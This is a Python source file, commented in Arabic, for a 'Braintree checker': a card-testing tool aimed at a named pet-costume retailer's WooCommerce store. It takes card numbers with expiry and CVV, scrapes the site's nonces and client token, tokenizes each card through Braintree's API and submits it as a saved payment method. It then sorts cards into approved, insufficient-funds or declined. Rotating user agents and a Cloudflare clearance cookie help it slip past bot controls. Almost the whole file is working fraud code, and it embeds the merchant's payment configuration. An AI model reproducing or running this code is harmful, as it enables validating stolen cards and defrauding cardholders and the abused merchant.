"""
وحدة Braintree للفحص - نسخة مبسطة
تستخدم موقع petcostumecenter.com
"""

import requests
import random
import time
import uuid
import json
import re

class BraintreeChecker:
    def __init__(self):
        self.url = 'https://petcostumecenter.com'
        
        # cf_clearance - يتم تحديثه تلقائياً
        self.cf_clearance = 'your_cf_clearance_here'
        
        # User-Agents عشوائية
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        ]
    
    def get_headers(self):
        """توليد headers عشوائية"""
        return {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="120", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': random.choice(self.user_agents),
        }
    
    def check_card(self, card_data):
        """
        فحص البطاقة
        
        Args:
            card_data (str): بيانات البطاقة بصيغة number|mm|yy|cvv
            
        Returns:
            dict: نتيجة الفحص
        """
        try:
            parts = card_data.split('|')
            n = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()[-2:]
            cvc = parts[3].strip()
        except:
            return {
                'status': 'error',
                'message': 'Invalid Card Format',
                'card_type': 'Unknown',
                'amount': '5.00'
            }
        
        session = requests.Session()
        cookies = {'cf_clearance': self.cf_clearance}
        
        try:
            # الحصول على الصفحة
            headers = self.get_headers()
            headers.update({
                'authority': 'petcostumecenter.com',
                'referer': self.url + '/my-account/payment-methods/',
            })
            
            response = session.get(
                self.url + '/my-account/add-payment-method/',
                cookies=cookies,
                headers=headers,
                timeout=30
            )
            
            # استخراج nonce
            add_nonce = re.search(r'add_card_nonce":"(.*?)"', response.text)
            if not add_nonce:
                return {
                    'status': 'error',
                    'message': 'Could not get nonce',
                    'card_type': 'Unknown',
                    'amount': '5.00'
                }
            
            add_nonce = add_nonce.group(1)
            
            # استخراج client token
            au = re.search(r'client_token_key":"(.*?)"', response.text)
            if not au:
                return {
                    'status': 'error',
                    'message': 'Could not get client token',
                    'card_type': 'Unknown',
                    'amount': '5.00'
                }
            
            au = au.group(1)
            
            # توليد payment token
            headers_token = self.get_headers()
            headers_token.update({
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
            })
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': str(uuid.uuid4())
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc
                        },
                        'options': {
                            'validate': False
                        }
                    }
                },
                'operationName': 'TokenizeCreditCard'
            }
            
            response_token = session.post(
                'https://payments.braintree-api.com/graphql',
                cookies=cookies,
                headers=headers_token,
                json=json_data,
                timeout=30
            )
            
            token_data = response_token.json()
            
            if 'data' not in token_data or 'tokenizeCreditCard' not in token_data['data']:
                return {
                    'status': 'declined',
                    'message': 'Invalid Card',
                    'card_type': 'Unknown',
                    'amount': '5.00'
                }
            
            tok = token_data['data']['tokenizeCreditCard']['token']
            
            # إرسال البطاقة للفحص
            headers_submit = self.get_headers()
            headers_submit.update({
                'authority': 'petcostumecenter.com',
                'origin': self.url,
                'referer': self.url + '/my-account/add-payment-method/',
            })
            
            data_submit = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': tok,
                'braintree_cc_device_data': '',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': json.dumps({
                    "environment": "production",
                    "clientApiUrl": "https://api.braintreegateway.com:443/merchants/t7hv62gg2zr28p8y/client_api",
                    "assetsUrl": "https://assets.braintreegateway.com",
                    "analytics": {"url": "https://client-analytics.braintreegateway.com/t7hv62gg2zr28p8y"},
                    "merchantId": "t7hv62gg2zr28p8y",
                    "venmo": "off",
                    "graphQL": {"url": "https://payments.braintree-api.com/graphql", "features": ["tokenize_credit_cards"]},
                    "kount": {"kountMerchantId": None},
                    "challenges": ["cvv"],
                    "creditCards": {"supportedCardTypes": ["MasterCard", "Visa", "Discover", "JCB", "American Express", "UnionPay"]},
                    "threeDSecureEnabled": False,
                    "threeDSecure": None,
                    "paypalEnabled": True,
                    "paypal": {"displayName": "Pet Costume Center", "clientId": None, "assetsUrl": "https://checkout.paypal.com", "environment": "live", "environmentNoNetwork": False, "unvettedMerchant": False, "braintreeClientId": "ARKrYRDh3AGXDzW7sO_3bSqamdHhgvBI_Lh0OZvLpynlOd4aBU1zfq1Utny1xQYY_xqAJMVYYTlGRKvA", "billingAgreementsEnabled": True, "merchantAccountId": "petcostumecenter_instant", "payeeEmail": None, "currencyIsoCode": "USD"}
                }),
                'wc-braintree-credit-card-card-type': 'master-card',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': tok,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': add_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1'
            }
            
            response_final = session.post(
                self.url + '/my-account/add-payment-method/',
                cookies=cookies,
                headers=headers_submit,
                data=data_submit,
                timeout=30
            )
            
            # تحليل النتيجة
            text = response_final.text
            
            if 'Nice! New payment method added' in text or 'Payment method successfully added' in text:
                return {
                    'status': 'approved',
                    'message': 'Approved',
                    'card_type': 'Visa/MasterCard',
                    'amount': '5.00'
                }
            elif 'risk_threshold' in text:
                return {
                    'status': 'approved',
                    'message': 'Risk Threshold',
                    'card_type': 'Visa/MasterCard',
                    'amount': '5.00'
                }
            elif 'Insufficient Funds' in text:
                return {
                    'status': 'approved',
                    'message': 'Insufficient Funds',
                    'card_type': 'Visa/MasterCard',
                    'amount': '5.00'
                }
            elif 'CVV' in text or 'security code' in text:
                return {
                    'status': 'declined',
                    'message': 'CVV Mismatch',
                    'card_type': 'Visa/MasterCard',
                    'amount': '5.00'
                }
            else:
                return {
                    'status': 'declined',
                    'message': 'Card Declined',
                    'card_type': 'Visa/MasterCard',
                    'amount': '5.00'
                }
                
        except requests.exceptions.Timeout:
            return {
                'status': 'error',
                'message': 'Request Timeout',
                'card_type': 'Unknown',
                'amount': '5.00'
            }
        except Exception as e:
            return {
                'status': 'error',
                'message': f'Error: {str(e)[:50]}',
                'card_type': 'Unknown',
                'amount': '5.00'
            }
